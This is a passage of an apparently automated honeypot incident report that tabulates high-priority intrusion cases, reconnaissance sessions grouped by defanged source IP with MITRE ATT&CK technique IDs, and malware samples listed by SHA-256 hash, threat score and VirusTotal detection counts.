| IR-849c139831c8 | HIGH | `180.76.236[.]214` | 2026-11-09 07:26 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9349af0c1c00 | HIGH | `180.76.236[.]214` | 2026-11-09 07:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ea5455ab11ab | HIGH | `191.44.112[.]76` | 2026-11-09 07:31 | Y | 0 | 0 | `T1078` |
| IR-839ae3037431 | HIGH | `222.97.112[.]179` | 2026-11-09 07:42 | Y | 6 | 0 | `T1078` |
| IR-61057f803fb3 | HIGH | `222.97.112[.]179` | 2026-11-09 07:43 | Y | 4 | 0 | `T1078` |
| IR-e1202eab7e83 | HIGH | `195.178.110[.]217` | 2026-11-09 07:51 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-073089162022 | HIGH | `195.178.110[.]217` | 2026-11-09 07:53 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-d1b0cd65a3c7 | HIGH | `103.159.2[.]113` | 2026-11-09 08:02 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8c084c028f59 | HIGH | `47.251.108[.]153` | 2026-11-09 08:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-20768f5c41b0 | HIGH | `176.53.159[.]196` | 2026-11-09 08:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-013443248114 | HIGH | `47.251.108[.]153` | 2026-11-09 08:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3d470946a726 | HIGH | `122.15.129[.]26` | 2026-11-09 08:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fc9251189b6a | HIGH | `122.15.129[.]26` | 2026-11-09 08:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ef4e619b37e7 | HIGH | `35.210.212[.]141` | 2026-11-09 08:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d13851ee99d2 | HIGH | `176.65.132[.]216` | 2026-11-09 08:23 | Y | 0 | 0 | `T1078` |
| IR-54d3888d57c3 | HIGH | `80.94.92[.]234` | 2026-11-09 08:34 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-7a94411cd377 | HIGH | `180.93.193[.]100` | 2026-11-09 08:34 | Y | 2 | 0 | `T1078 · T1083` |
| IR-9455ceac7c1f | HIGH | `80.94.92[.]234` | 2026-11-09 08:39 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ac0664682967 | HIGH | `80.94.92[.]234` | 2026-11-09 08:42 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f3955c994fcd | HIGH | `80.94.92[.]234` | 2026-11-09 08:46 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-8964fa06a72c | HIGH | `80.94.92[.]234` | 2026-11-09 08:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-cd1a9f37318f | HIGH | `203.190.153[.]90` | 2026-11-09 08:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f520828646f3 | HIGH | `203.190.153[.]90` | 2026-11-09 08:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-282fc2240bc9 | HIGH | `80.94.92[.]234` | 2026-11-09 08:53 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0ca99f0eb651 | HIGH | `101.227.203[.]162` | 2026-11-09 08:55 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-7913a055de4b | HIGH | `80.94.92[.]234` | 2026-11-09 08:59 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-55e1a21b8b16 | HIGH | `80.94.92[.]234` | 2026-11-09 09:03 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-19f010aaa105 | HIGH | `80.94.92[.]234` | 2026-11-09 09:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1105` |
| IR-7497a3ef7ce5 | HIGH | `85.185.201[.]10` | 2026-11-09 09:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8358bd59559e | HIGH | `85.185.201[.]10` | 2026-11-09 09:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b2450ae50cbf | HIGH | `91.186.216[.]80` | 2026-11-09 09:12 | Y | 0 | 0 | `T1078` |
| IR-d7585a471a23 | HIGH | `35.210.75[.]155` | 2026-11-09 09:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dfaed1c06d2d | HIGH | `223.233.85[.]150` | 2026-11-09 09:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-76ea9c7aece4 | HIGH | `223.233.85[.]150` | 2026-11-09 09:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-26880cca0f5f | HIGH | `193.32.162[.]15` | 2026-11-09 09:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-366c8bd92743 | HIGH | `103.159.2[.]113` | 2026-11-09 10:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c53108e2d9ad | HIGH | `104.244.79[.]113` | 2026-11-09 10:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aeb92b73b05b | HIGH | `176.53.159[.]196` | 2026-11-09 10:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2a8ca732ae40 | HIGH | `35.210.236[.]178` | 2026-11-09 11:10 | Y | 3 | 0 | `T1078` |
| IR-414932003a90 | HIGH | `35.210.236[.]178` | 2026-11-09 11:10 | Y | 1 | 0 | `T1078` |
| IR-5a3b937f3fae | HIGH | `35.210.236[.]178` | 2026-11-09 11:10 | Y | 0 | 0 | `T1078` |
| IR-a61ba0019f77 | HIGH | `163.7.1[.]218` | 2026-11-09 11:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-856e210f3619 | HIGH | `163.7.1[.]218` | 2026-11-09 11:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-284e1244bffb | HIGH | `185.194.205[.]32` | 2026-11-09 11:17 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b6218aba723b | HIGH | `185.194.205[.]32` | 2026-11-09 11:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d8d6961c0143 | HIGH | `141.94.26[.]113` | 2026-11-09 11:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-81903c56d400 | HIGH | `141.94.26[.]113` | 2026-11-09 11:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dceb63c641cc | HIGH | `35.210.246[.]75` | 2026-11-09 11:47 | Y | 3 | 0 | `T1078` |
| IR-adbb56557eee | HIGH | `35.210.246[.]75` | 2026-11-09 11:47 | Y | 1 | 0 | `T1078` |
| IR-b7b24edbf321 | HIGH | `35.210.246[.]75` | 2026-11-09 11:48 | Y | 0 | 0 | `T1078` |
| IR-0135d3a7165d | HIGH | `149.202.60[.]122` | 2026-11-09 12:07 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-553009d8469e | HIGH | `149.202.60[.]122` | 2026-11-09 12:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e695f2c65ee0 | HIGH | `14.155.244[.]201` | 2026-11-09 12:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-375747430952 | HIGH | `14.155.244[.]201` | 2026-11-09 12:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0bfd72ed4bd3 | HIGH | `14.103.115[.]182` | 2026-11-09 12:21 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-404421ccb37d | HIGH | `14.103.115[.]182` | 2026-11-09 12:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6ebee062cc5f | HIGH | `51.254.130[.]161` | 2026-11-09 12:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b6dda427d328 | HIGH | `51.254.130[.]161` | 2026-11-09 12:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8ba05e80b214 | HIGH | `103.123.53[.]88` | 2026-11-09 12:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f96d585c3855 | HIGH | `103.123.53[.]88` | 2026-11-09 12:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-96a03c5dfcdd | HIGH | `190.244.24[.]186` | 2026-11-09 12:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b092357bfa03 | HIGH | `190.244.24[.]186` | 2026-11-09 12:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-42596da1873c | HIGH | `14.103.90[.]3` | 2026-11-09 12:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fcc0eb6ed3f3 | HIGH | `14.103.90[.]3` | 2026-11-09 12:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-de54da312a2f | HIGH | `176.53.159[.]196` | 2026-11-09 12:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c9676815948f | HIGH | `94.180.139[.]162` | 2026-11-09 12:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b13e55fb1405 | HIGH | `94.180.139[.]162` | 2026-11-09 12:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-85ac3315d4f7 | HIGH | `193.32.162[.]15` | 2026-11-09 12:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f467a7ea62a8 | HIGH | `35.210.149[.]174` | 2026-11-09 12:55 | Y | 3 | 0 | `T1078` |
_… 52 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `177.22.43[.]218` | **2** | 2026-11-09 11:26 | 2026-11-09 12:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `188.129.180[.]21` | **2** | 2026-11-09 15:57 | 2026-11-09 16:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.66.165[.]103` | 1 | 2026-11-09 10:16 | 2026-11-09 10:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.159.2[.]113` | 1 | 2026-11-09 06:17 | 2026-11-09 06:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-11-09 05:05 | 2026-11-09 05:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.242.224[.]91` | 1 | 2026-11-09 11:46 | 2026-11-09 11:46 | 32s | 0 | `T1592` | 🟢 LOW |
| `103.39.121[.]228` | 1 | 2026-11-09 03:07 | 2026-11-09 03:07 | 34s | 0 | `T1592` | 🟢 LOW |
| `104.244.79[.]113` | 1 | 2026-11-09 10:37 | 2026-11-09 10:37 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.248.152[.]49` | 1 | 2026-11-09 05:54 | 2026-11-09 05:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]155` | 1 | 2026-11-09 02:55 | 2026-11-09 02:55 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.12.6[.]226` | 1 | 2026-11-09 16:16 | 2026-11-09 16:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.16.38[.]128` | 1 | 2026-11-09 17:13 | 2026-11-09 17:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.42.32[.]125` | 1 | 2026-11-09 04:32 | 2026-11-09 04:32 | 32s | 0 | `T1592` | 🟢 LOW |
| `128.201.9[.]177` | 1 | 2026-11-09 15:40 | 2026-11-09 15:40 | 32s | 0 | `T1592` | 🟢 LOW |
| `134.209.108[.]59` | 1 | 2026-11-09 04:14 | 2026-11-09 04:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `136.51.92[.]56` | 1 | 2026-11-09 12:14 | 2026-11-09 12:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]197` | 1 | 2026-11-09 16:28 | 2026-11-09 16:28 | 1s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-09 04:46 | 2026-11-09 04:47 | 52s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-09 16:18 | 2026-11-09 16:19 | 68s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-09 19:25 | 2026-11-09 19:26 | 69s | 0 | `T1592` | 🟢 LOW |
| `160.250.80[.]241` | 1 | 2026-11-09 15:47 | 2026-11-09 15:48 | 13s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-11-09 19:50 | 2026-11-09 19:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.169.161[.]242` | 1 | 2026-11-09 05:25 | 2026-11-09 05:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `168.0.82[.]255` | 1 | 2026-11-09 20:39 | 2026-11-09 20:40 | 33s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-09 18:30 | 2026-11-09 18:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.93.193[.]100` | 1 | 2026-11-09 08:34 | 2026-11-09 08:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.93.245[.]203` | 1 | 2026-11-09 11:54 | 2026-11-09 11:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]37` | 1 | 2026-11-09 19:00 | 2026-11-09 19:00 | 4s | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]38` | 1 | 2026-11-09 19:00 | 2026-11-09 19:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]39` | 1 | 2026-11-09 19:01 | 2026-11-09 19:01 | 4s | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]40` | 1 | 2026-11-09 19:00 | 2026-11-09 19:01 | 8s | 0 | `T1592` | 🟢 LOW |
| `186.22.17[.]193` | 1 | 2026-11-09 17:45 | 2026-11-09 17:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `188.228.215[.]246` | 1 | 2026-11-09 12:06 | 2026-11-09 12:06 | 13s | 0 | `T1592` | 🟢 LOW |
| `189.203.205[.]237` | 1 | 2026-11-09 13:54 | 2026-11-09 13:55 | 13s | 0 | `T1592` | 🟢 LOW |
| `189.219.230[.]187` | 1 | 2026-11-09 14:24 | 2026-11-09 14:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.104.45[.]4` | 1 | 2026-11-09 16:37 | 2026-11-09 16:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.83.64[.]246` | 1 | 2026-11-09 05:42 | 2026-11-09 05:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-09 06:41 | 2026-11-09 06:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-09 09:43 | 2026-11-09 09:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-09 12:55 | 2026-11-09 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-09 19:57 | 2026-11-09 19:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.187.176[.]95` | 1 | 2026-11-09 13:02 | 2026-11-09 13:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | 1 | 2026-11-09 07:50 | 2026-11-09 07:50 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]228` | 1 | 2026-11-09 17:30 | 2026-11-09 17:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `197.255.143[.]160` | 1 | 2026-11-09 12:21 | 2026-11-09 12:21 | 33s | 0 | `T1592` | 🟢 LOW |
| `198.251.62[.]31` | 1 | 2026-11-09 10:53 | 2026-11-09 10:53 | 34s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | 1 | 2026-11-09 02:57 | 2026-11-09 02:57 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-11-09 04:14 | 2026-11-09 04:14 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.150.195[.]29` | 1 | 2026-11-09 13:01 | 2026-11-09 13:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.42.59[.]55` | 1 | 2026-11-09 07:41 | 2026-11-09 07:41 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.112.132[.]24` | 1 | 2026-11-09 19:08 | 2026-11-09 19:08 | 32s | 0 | `T1592` | 🟢 LOW |
| `217.199.144[.]38` | 1 | 2026-11-09 18:42 | 2026-11-09 18:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `23.132.164[.]185` | 1 | 2026-11-09 14:49 | 2026-11-09 14:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `24.41.187[.]135` | 1 | 2026-11-09 03:53 | 2026-11-09 03:53 | 14s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-11-09 09:56 | 2026-11-09 09:56 | 9s | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | 1 | 2026-11-09 18:03 | 2026-11-09 18:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.116[.]204` | 1 | 2026-11-09 20:10 | 2026-11-09 20:10 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.129[.]188` | 1 | 2026-11-09 08:32 | 2026-11-09 08:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.149[.]174` | 1 | 2026-11-09 12:55 | 2026-11-09 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.212[.]141` | 1 | 2026-11-09 08:20 | 2026-11-09 08:20 | 3s | 0 | `T1592` | 🟢 LOW |
| `35.210.236[.]178` | 1 | 2026-11-09 11:10 | 2026-11-09 11:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.24[.]13` | 1 | 2026-11-09 09:22 | 2026-11-09 09:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.24[.]13` | 1 | 2026-11-09 20:16 | 2026-11-09 20:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.246[.]75` | 1 | 2026-11-09 11:47 | 2026-11-09 11:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.75[.]155` | 1 | 2026-11-09 09:18 | 2026-11-09 09:18 | 3s | 0 | `T1592` | 🟢 LOW |
| `37.54.221[.]227` | 1 | 2026-11-09 05:56 | 2026-11-09 05:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]237` | 1 | 2026-11-09 16:39 | 2026-11-09 16:40 | 60s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]238` | 1 | 2026-11-09 19:36 | 2026-11-09 19:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.50.160[.]159` | 1 | 2026-11-09 08:20 | 2026-11-09 08:21 | 34s | 0 | `T1592` | 🟢 LOW |
| `38.64.19[.]210` | 1 | 2026-11-09 20:35 | 2026-11-09 20:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `43.228.157[.]68` | 1 | 2026-11-09 09:20 | 2026-11-09 09:20 | 29s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-11-09 10:05 | 2026-11-09 10:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-11-09 19:05 | 2026-11-09 19:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]120` | 1 | 2026-11-09 06:24 | 2026-11-09 06:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]121` | 1 | 2026-11-09 06:24 | 2026-11-09 06:24 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]78` | 1 | 2026-11-09 08:02 | 2026-11-09 08:02 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.190.78[.]143` | 1 | 2026-11-09 15:12 | 2026-11-09 15:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.230.39[.]168` | 1 | 2026-11-09 13:24 | 2026-11-09 13:25 | 14s | 0 | `T1592` | 🟢 LOW |
| `45.4.113[.]22` | 1 | 2026-11-09 05:17 | 2026-11-09 05:18 | 33s | 0 | `T1592` | 🟢 LOW |
| `45.70.188[.]55` | 1 | 2026-11-09 12:37 | 2026-11-09 12:38 | 33s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-11-09 09:36 | 2026-11-09 09:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.237.137[.]196` | 1 | 2026-11-09 06:05 | 2026-11-09 06:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-11-09 20:54 | 2026-11-09 20:54 | 1s | 0 | `T1592` | 🟢 LOW |
| `52.165.88[.]73` | 1 | 2026-11-09 06:50 | 2026-11-09 06:50 | 9s | 0 | `T1592` | 🟢 LOW |
| `60.205.176[.]204` | 1 | 2026-11-09 15:05 | 2026-11-09 15:05 | 4s | 0 | `T1592` | 🟢 LOW |
| `61.106.81[.]21` | 1 | 2026-11-09 06:14 | 2026-11-09 06:14 | 13s | 0 | `T1592` | 🟢 LOW |
| `64.205.72[.]240` | 1 | 2026-11-09 20:04 | 2026-11-09 20:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]167` | 1 | 2026-11-09 06:04 | 2026-11-09 06:04 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]2` | 1 | 2026-11-09 05:16 | 2026-11-09 05:16 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]27` | 1 | 2026-11-09 06:07 | 2026-11-09 06:08 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]131` | 1 | 2026-11-09 03:39 | 2026-11-09 03:40 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]24` | 1 | 2026-11-09 17:46 | 2026-11-09 17:46 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]135` | 1 | 2026-11-09 08:31 | 2026-11-09 08:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]111` | 1 | 2026-11-09 03:40 | 2026-11-09 03:40 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]48` | 1 | 2026-11-09 12:25 | 2026-11-09 12:25 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]61` | 1 | 2026-11-09 03:39 | 2026-11-09 03:39 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]64` | 1 | 2026-11-09 07:30 | 2026-11-09 07:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]136` | 1 | 2026-11-09 16:37 | 2026-11-09 16:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-11-09 06:39 | 2026-11-09 06:39 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]208` | 1 | 2026-11-09 06:04 | 2026-11-09 06:04 | 10s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]208` | 1 | 2026-11-09 11:04 | 2026-11-09 11:04 | 10s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]240` | 1 | 2026-11-09 08:09 | 2026-11-09 08:09 | 10s | 0 | `T1592` | 🟢 LOW |
| `68.185.222[.]14` | 1 | 2026-11-09 13:55 | 2026-11-09 13:55 | 14s | 0 | `T1592` | 🟢 LOW |
| `71.73.105[.]172` | 1 | 2026-11-09 19:46 | 2026-11-09 19:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.90.30[.]53` | 1 | 2026-11-09 19:16 | 2026-11-09 19:17 | 33s | 0 | `T1592` | 🟢 LOW |
| `74.82.47[.]5` | 1 | 2026-11-09 11:42 | 2026-11-09 11:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-09 05:33 | 2026-11-09 05:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-09 17:07 | 2026-11-09 17:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-09 20:38 | 2026-11-09 20:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-09 14:54 | 2026-11-09 14:54 | 6s | 0 | `T1592` | 🟢 LOW |
| `79.124.40[.]126` | 1 | 2026-11-09 12:39 | 2026-11-09 12:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.129.229[.]164` | 1 | 2026-11-09 03:31 | 2026-11-09 03:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-11-09 08:56 | 2026-11-09 08:56 | 9s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.217.149[.]20` | 1 | 2026-11-09 15:12 | 2026-11-09 15:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]41` | 1 | 2026-11-09 05:05 | 2026-11-09 05:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]46` | 1 | 2026-11-09 18:16 | 2026-11-09 18:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]43` | 1 | 2026-11-09 03:35 | 2026-11-09 03:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `87.251.64[.]128` | 1 | 2026-11-09 10:36 | 2026-11-09 10:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.68.210[.]10` | 1 | 2026-11-09 11:15 | 2026-11-09 11:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-11-09 17:47 | 2026-11-09 17:47 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `98.100.9[.]202` | 1 | 2026-11-09 19:22 | 2026-11-09 19:22 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
